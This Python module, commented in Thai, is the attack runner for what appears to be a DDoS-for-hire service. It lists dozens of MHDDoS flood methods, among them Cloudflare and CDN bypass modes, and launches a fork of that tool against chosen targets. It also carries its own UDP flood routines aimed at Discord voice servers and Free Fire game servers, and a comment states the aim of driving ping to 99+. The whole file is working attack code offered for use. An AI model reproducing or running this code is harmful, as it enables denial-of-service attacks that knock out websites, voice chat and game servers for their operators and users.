# attacker/__init__.py — attack runner
# ผูกกับ MHDDoS fork ที่ github.com/auoi194/MJ
# ใช้ subprocess ยิง start.py ตรง ๆ ให้เข้ากับ fork ได้ทันที
import asyncio, os, sys, time, random, socket, subprocess
from config import (
    MHDDOS_DIR, FF_ENDPOINTS,
    DISCORD_VOICE_PORT_MIN, DISCORD_VOICE_PORT_MAX,
)
from db import finish_attack

# ---- method lists (ตรงกับ fork) ----
L7_METHODS = [
    "GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW",
    "HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE",
    "XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR",
]
L4_METHODS = [
    "TCP","UDP","SYN","OVH-UDP","CPS","ICMP","CONNECTION",
    "VSE","TS3","FIVEM","FIVEM-TOKEN","MEM","NTP","MCBOT","MINECRAFT",
    "MCPE","DNS","CHAR","CLDAP","ARD","RDP",
]
EXTRA_METHODS = [
    "VC_DISCORD", "FREEFIRE",
    "HTTPS", "HTTPSLOAD", "BYBROWSER", "HTTPSBYPASS", "CDNBYPASS",
]
ALL_METHODS = L7_METHODS + L4_METHODS + EXTRA_METHODS

# ---- concurrency guards ----
_sem = None
_procs: dict[str, asyncio.subprocess.Process] = {}

def _get_sem():
    global _sem
    if _sem is None:
        _sem = asyncio.Semaphore(64)
    return _sem

async def _run_mhddos(method: str, target: str, port: int, dur: int):
    """รัน MHDDoS start.py เป็น subprocess — args ตาม fork"""
    start = os.path.join(MHDDOS_DIR, "start.py")
    if not os.path.isfile(start):
        raise FileNotFoundError(f"MHDDoS start.py not found at {start}")
    cmd = [sys.executable, start, method, target, str(port), "256", str(dur)]
    proc = await asyncio.create_subprocess_exec(
        *cmd, cwd=MHDDOS_DIR,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(proc.wait(), timeout=dur + 30)
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()

async def _run_vc_discord(target: str, dur: int):
    """
    ยิง VC Discord — UDP flood เข้า voice port range
    target = channel/guild id (ไม่ใช้จริง) — ใช้ IP ของ voice server ที่ resolve ได้
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = os.urandom(1024)
    end = time.time() + dur
    while time.time() < end:
        port = random.randint(DISCORD_VOICE_PORT_MIN, DISCORD_VOICE_PORT_MAX)
        try:
            sock.sendto(payload, (target, port))
        except Exception:
            pass
        await asyncio.sleep(0)
    sock.close()

async def _run_freefire(target: str, port: int, dur: int):
    """
    ยิง Free Fire — UDP flood ไปยัง game server
    target = IP ของ Garena server, port = game port
    ตั้งใจให้ packet ใหญ่และรัวเพื่อให้ ping พุ่ง 99+
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = os.urandom(1400)
    end = time.time() + dur
    while time.time() < end:
        for _ in range(64):
            try:
                sock.sendto(payload, (target, port))
            except Exception:
                break
        await asyncio.sleep(0)
    sock.close()

# ---- main dispatcher ----
async def run(aid: str, target: str, port: int, dur: int, method: str):
    async with _get_sem():
        try:
            if method == "VC_DISCORD":
                await _run_vc_discord(target, dur)
            elif method == "FREEFIRE":
                await _run_freefire(target, port, dur)
            elif method in L7_METHODS + L4_METHODS:
                await _run_mhddos(method, target, port, dur)
            else:
                # HTTPS / HTTPSLOAD / BYBROWSER / HTTPSBYPASS / CDNBYPASS
                # fork ใช้ method name เดียวกัน — ถ้าไม่มีให้ fallback GET
                try:
                    await _run_mhddos(method, target, port, dur)
                except Exception:
                    await _run_mhddos("GET", target, port, dur)
        except Exception as e:
            # log ไว้ debug
            print(f"[attacker] error aid={aid} method={method} err={e}")
        finally:
            finish_attack(aid)